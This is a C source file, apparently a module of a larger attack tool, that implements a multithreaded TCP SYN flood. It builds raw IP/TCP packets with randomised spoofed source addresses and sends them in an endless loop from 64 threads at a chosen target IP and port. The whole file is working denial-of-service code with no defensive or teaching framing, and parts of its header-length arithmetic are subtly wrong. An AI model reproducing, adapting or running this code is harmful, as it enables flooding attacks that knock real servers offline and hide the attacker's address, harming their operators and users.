#define _GNU_SOURCE
#include <time.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define MAXTHREADS 64
#define SYNC_ADD_AND_FETCH(x) __sync_add_and_fetch(&(x), 1)

int socketfd;
static int alive = 1;
char target_ip[20] = {0};
int target_port;
int64_t count = 0;

typedef struct ip_t
{
    uint8_t header_len;
    uint8_t tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag_and_flags;
    uint8_t ttl;
    uint8_t transport;
    uint16_t checksum;
    uint32_t sourceIP;
    uint32_t destIP;
} ip;

typedef struct tcphdr_t
{
    uint16_t sport;
    uint16_t dport;
    uint32_t seq;
    uint32_t ack;
    uint8_t lenres;
    uint8_t flag;
    uint16_t win;
    uint16_t sum;
    uint16_t urp;
} tcphdr;

typedef struct pseudohdr_t
{
    uint32_t saddr;
    uint32_t daddr;
    uint8_t zero;
    uint8_t protocol;
    uint16_t length;
} pseudohdr;

uint16_t crc16_checksum(uint16_t *buffer, uint16_t size)
{
    uint64_t cksum = 0;
    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(uint16_t);
    }
    if (size)
    {
        cksum += *(uint8_t *)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (uint16_t)(~cksum);
}

void initialize_headers(ip *ip, tcphdr *tcp, pseudohdr *pseudoheader)
{
    int len = sizeof(ip) + sizeof(tcphdr);
    ip->header_len = (4 << 4 | sizeof(ip) / sizeof(uint32_t));
    ip->total_len = htons(len);
    ip->id = htons(1);
    ip->frag_and_flags = htons(0x4000);
    ip->ttl = 255;
    ip->transport = IPPROTO_TCP;
    ip->checksum = 0;
    ip->sourceIP = rand();
    ip->destIP = inet_addr(target_ip);
    tcp->sport = htons(rand() % 16383 + 49152);
    tcp->dport = htons(target_port);
    tcp->seq = htonl(rand() % 90000000 + 2345);
    tcp->ack = 0;
    tcp->lenres = (sizeof(tcphdr) / 4 << 4);
    tcp->flag = 0x02;
    tcp->win = htons(2048);
    tcp->sum = 0;
    tcp->urp = 0;
    pseudoheader->zero = 0;
    pseudoheader->protocol = IPPROTO_TCP;
    pseudoheader->length = htons(sizeof(tcphdr));
    pseudoheader->daddr = inet_addr(target_ip);
    pseudoheader->saddr = ip->sourceIP;
    srand((unsigned)time(NULL));
}

void *_flood(void *addr)
{
    uint8_t buf[100], sendbuf[100];
    int len;
    ip ip;
    tcphdr tcp;
    pseudohdr pseudoheader;
    len = sizeof(ip) + sizeof(tcphdr);
    initialize_headers(&ip, &tcp, &pseudoheader);
    struct sockaddr_in *target = (struct sockaddr_in *)addr;
    while (alive)
    {
        ip.sourceIP = rand();
        memset(buf, 0, sizeof(buf));
        memcpy(buf, &ip, sizeof(ip));
        ip.checksum = crc16_checksum((uint16_t *)buf, sizeof(ip));
        pseudoheader.saddr = ip.sourceIP;
        memset(buf, 0, sizeof(buf));
        memcpy(buf, &pseudoheader, sizeof(pseudoheader));
        memcpy(buf + sizeof(pseudoheader), &tcp, sizeof(tcphdr));
        tcp.sum = crc16_checksum((uint16_t *)buf, sizeof(pseudoheader) + sizeof(tcphdr));
        memset(sendbuf, 0, sizeof(sendbuf));
        memcpy(sendbuf, &ip, sizeof(ip));
        memcpy(sendbuf + sizeof(ip), &tcp, sizeof(tcphdr));
        SYNC_ADD_AND_FETCH(count);
        if (sendto(socketfd, sendbuf, len, 0, (struct sockaddr *)target, sizeof(struct sockaddr_in)) < 0)
        {
            pthread_exit(NULL);
        }
    }
    return NULL;
}

void sig_int(int signo)
{
    alive = 0;
}

void start_attack(const char *ip, int port)
{

#ifdef DEBUG
    printf("[synflood] Starting synflood (TCP) attack...\n");
#endif

    struct sockaddr_in addr;
    pthread_t pthread[MAXTHREADS];
    signal(SIGINT, sig_int);
    strncpy(target_ip, ip, sizeof(target_ip) - 1);
    target_port = port;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);

    socketfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socketfd < 0)
        exit(1);

    int on = 1;
    setsockopt(socketfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    setuid(getpid());

    for (int i = 0; i < MAXTHREADS; i++)
    {
        pthread_create(&pthread[i], NULL, _flood, &addr);
    }

    for (int i = 0; i < MAXTHREADS; i++)
    {
        pthread_join(pthread[i], NULL);
    }

    close(socketfd);
    exit(0);
}
